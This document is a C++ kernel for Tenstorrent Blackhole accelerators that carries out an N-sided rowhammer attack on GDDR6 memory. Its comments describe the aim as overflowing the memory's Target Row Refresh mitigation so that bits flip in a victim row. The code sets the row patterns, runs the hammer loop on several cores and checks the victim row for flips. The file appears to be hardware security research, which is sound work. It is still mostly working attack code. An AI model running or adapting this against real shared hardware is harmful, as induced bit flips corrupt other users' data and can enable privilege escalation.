// SPDX-FileCopyrightText: © 2026
// SPDX-License-Identifier: Apache-2.0
//
// N-sided rowhammer kernel for Tenstorrent Blackhole GDDR6.
//
// This kernel extends the double-sided rowhammer attack to use N aggressor
// rows instead of 2.  The purpose is to overflow the TRR (Target Row Refresh)
// mitigation built into GDDR6 DRAM controllers.
//
// TRR works by sampling frequently-activated rows and preemptively refreshing
// their neighbors.  With only 2 aggressors, TRR easily tracks them.  By using
// N aggressors (typically 8-15), we overflow TRR's limited counter table, so
// it can't track ALL the hot rows.  The real aggressors (immediately adjacent
// to the victim) may evade TRR refresh and cause bit flips.
//
// === DRAM bank geometry (from TT-Rowhammer) ===
//   Row size:     8 KB (8192 bytes)
//   Same-bank:    addresses differing in bits 13-16 (873 cycle latency)
//   Diff-bank:    addresses differing in bits 17+ (897 cycle latency)
//   Bank size:    16 rows (128 KB), so max 15 aggressors per bank
//
// === Multi-core support ===
//   core_id=0: writes patterns (Phase 1), hammers (Phase 2), verifies (Phase 3)
//   core_id>0: hammers only (Phase 2). Skips write & verify.
//   All cores run simultaneously.  Core 0's writes complete in microseconds;
//   the hammer loop runs for seconds, so the brief unsynchronized start is
//   negligible.
//
// === Runtime arguments ===
//   arg 0:  dram_noc_x       DRAM endpoint NOC X
//   arg 1:  dram_noc_y       DRAM endpoint NOC Y
//   arg 2:  victim_addr      victim row base address (8KB aligned)
//   arg 3:  hammer_iters     number of full sweeps through all aggressors
//   arg 4:  data_pattern     32-bit fill pattern for victim
//   arg 5:  l1_scratch_addr  L1 scratch buffer (>= 128 bytes)
//   arg 6:  l1_result_addr   L1 result buffer
//   arg 7:  use_barrier      0 = pipelined, 1 = serialized
//   arg 8:  num_aggressors   number of aggressor rows (2..30)
//   arg 9:  core_id          0 = primary (write+verify), >0 = hammer-only
//   arg 10+: aggressor DRAM addresses (num_aggressors entries)

#include <cstdint>

constexpr uint32_t ROW_SIZE          = 8192;
constexpr uint32_t CACHELINE         = 64;
constexpr uint32_t CACHELINES_PER_ROW = ROW_SIZE / CACHELINE;  // 128
constexpr uint32_t MAX_AGGRESSORS    = 30;

// Result buffer layout (same as original kernel for host compatibility)
constexpr uint32_t RESULT_HDR_WORDS  = 6;
constexpr uint32_t MAX_FLIP_RECORDS  = 32;
constexpr uint32_t FLIP_RECORD_WORDS = 4;
constexpr uint32_t RESULT_BUF_WORDS  = RESULT_HDR_WORDS + MAX_FLIP_RECORDS * FLIP_RECORD_WORDS;

void kernel_main() {
    // ─── runtime arguments ────────────────────────────────────────────
    uint32_t dram_noc_x      = get_arg_val<uint32_t>(0);
    uint32_t dram_noc_y      = get_arg_val<uint32_t>(1);
    uint32_t victim_addr     = get_arg_val<uint32_t>(2);
    uint32_t hammer_iters    = get_arg_val<uint32_t>(3);
    uint32_t data_pattern    = get_arg_val<uint32_t>(4);
    uint32_t l1_scratch_addr = get_arg_val<uint32_t>(5);
    uint32_t l1_result_addr  = get_arg_val<uint32_t>(6);
    uint32_t use_barrier     = get_arg_val<uint32_t>(7);
    uint32_t num_aggressors  = get_arg_val<uint32_t>(8);
    uint32_t core_id         = get_arg_val<uint32_t>(9);

    if (num_aggressors > MAX_AGGRESSORS) num_aggressors = MAX_AGGRESSORS;

    // Read aggressor addresses
    uint32_t aggr_addrs[MAX_AGGRESSORS];
    for (uint32_t i = 0; i < num_aggressors; i++) {
        aggr_addrs[i] = get_arg_val<uint32_t>(10 + i);
    }

    uint32_t scratch_a = l1_scratch_addr;
    uint32_t scratch_b = l1_scratch_addr + CACHELINE;

    volatile uint32_t* results = reinterpret_cast<volatile uint32_t*>(l1_result_addr);

    // Zero result buffer
    for (uint32_t i = 0; i < RESULT_BUF_WORDS; i++) {
        results[i] = 0;
    }

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 1: Write patterns (core 0 only)
    // ═══════════════════════════════════════════════════════════════════
    // Core 0 writes the known data pattern to the victim row and the
    // complementary pattern to ALL aggressor rows.  Other cores skip
    // this phase — they start hammering immediately, which is fine because
    // DRAM row activations occur regardless of stored data, and core 0's
    // writes land within microseconds (vs. seconds of hammering).

    if (core_id == 0) {
        // Fill scratch_a with victim pattern
        volatile uint32_t* fill = reinterpret_cast<volatile uint32_t*>(scratch_a);
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
            fill[w] = data_pattern;
        }

        // Write to every cache line of the victim row
        for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
            uint64_t dst = get_noc_addr(dram_noc_x, dram_noc_y, victim_addr + cl * CACHELINE);
            noc_async_write(scratch_a, dst, CACHELINE);
        }
        noc_async_write_barrier();

        // Fill scratch_b with complementary aggressor pattern
        uint32_t aggr_pattern = ~data_pattern;
        volatile uint32_t* fill_b = reinterpret_cast<volatile uint32_t*>(scratch_b);
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
            fill_b[w] = aggr_pattern;
        }

        // Write complementary pattern to ALL aggressor rows
        for (uint32_t a = 0; a < num_aggressors; a++) {
            for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
                uint64_t dst = get_noc_addr(dram_noc_x, dram_noc_y,
                                            aggr_addrs[a] + cl * CACHELINE);
                noc_async_write(scratch_b, dst, CACHELINE);
            }
        }
        noc_async_write_barrier();
    }

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 2: N-sided hammer loop (ALL cores)
    // ═══════════════════════════════════════════════════════════════════
    // Each iteration cycles through all N aggressors in round-robin.
    // This is the TRR evasion pattern: by accessing many different rows,
    // we overflow the TRR counter table (typically 1-16 entries).
    // The real aggressors (V±1) are mixed in with dummy aggressors,
    // so TRR can't reliably identify which rows need neighbor refresh.
    //
    // Total activations per core = hammer_iters × num_aggressors.
    // With M cores, total activations = M × iterations × N_aggr.

    // Pre-compute NOC addresses for all aggressors
    uint64_t aggr_noc[MAX_AGGRESSORS];
    for (uint32_t i = 0; i < num_aggressors; i++) {
        aggr_noc[i] = get_noc_addr(dram_noc_x, dram_noc_y, aggr_addrs[i]);
    }

    // Start timing
    volatile uint32_t ts_lo = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t ts_hi = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_start = (static_cast<uint64_t>(ts_hi) << 32) | ts_lo;

    if (use_barrier) {
        // Serialized mode: barrier after each read.
        // Ensures every read completes (confirmed DRAM activation) before
        // the next one.  Slower but guarantees real row switches.
        for (uint32_t i = 0; i < hammer_iters; i++) {
            for (uint32_t j = 0; j < num_aggressors; j++) {
                noc_async_read(aggr_noc[j], scratch_a, CACHELINE);
                noc_async_read_barrier();
            }
        }
    } else {
        // Pipelined mode: no barrier, maximum issue rate.
        // The NOC pipeline handles multiple outstanding reads.
        // Each read still triggers a DRAM row activation, even if
        // we don't wait for it to complete.
        for (uint32_t i = 0; i < hammer_iters; i++) {
            for (uint32_t j = 0; j < num_aggressors; j++) {
                noc_async_read(aggr_noc[j], scratch_a, CACHELINE);
            }
        }
    }

    // Drain pipeline
    noc_async_read_barrier();

    // End timing
    volatile uint32_t te_lo = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t te_hi = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_end = (static_cast<uint64_t>(te_hi) << 32) | te_lo;
    uint64_t elapsed = t_end - t_start;

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 3: Verify victim row (core 0 only)
    // ═══════════════════════════════════════════════════════════════════
    // Only the primary core reads back and checks the victim row.
    // Other cores just report their timing/activation stats.

    uint32_t num_flips = 0;
    uint32_t total_bit_flips = 0;
    uint32_t record_idx = 0;

    if (core_id == 0) {
        for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
            uint64_t victim_noc = get_noc_addr(dram_noc_x, dram_noc_y,
                                               victim_addr + cl * CACHELINE);
            noc_async_read(victim_noc, scratch_a, CACHELINE);
            noc_async_read_barrier();

            volatile uint32_t* readback = reinterpret_cast<volatile uint32_t*>(scratch_a);
            for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
                uint32_t actual = readback[w];
                if (actual != data_pattern) {
                    num_flips++;

                    uint32_t diff = actual ^ data_pattern;
                    uint32_t bits = 0;
                    while (diff) { bits += diff & 1; diff >>= 1; }
                    total_bit_flips += bits;

                    if (record_idx < MAX_FLIP_RECORDS) {
                        uint32_t base = RESULT_HDR_WORDS + record_idx * FLIP_RECORD_WORDS;
                        results[base + 0] = cl;
                        results[base + 1] = w;
                        results[base + 2] = data_pattern;
                        results[base + 3] = actual;
                        record_idx++;
                    }
                }
            }
        }
    }

    // ─── write results ────────────────────────────────────────────────
    uint32_t total_activations = hammer_iters * num_aggressors;
    results[0] = 0;                                    // status
    results[1] = num_flips;                            // words with flips (core 0 only)
    results[2] = total_bit_flips;                      // individual bit flips (core 0 only)
    results[3] = static_cast<uint32_t>(elapsed);       // cycles (low 32)
    results[4] = static_cast<uint32_t>(elapsed >> 32); // cycles (high 32)
    results[5] = total_activations;                    // total activations on THIS core
}
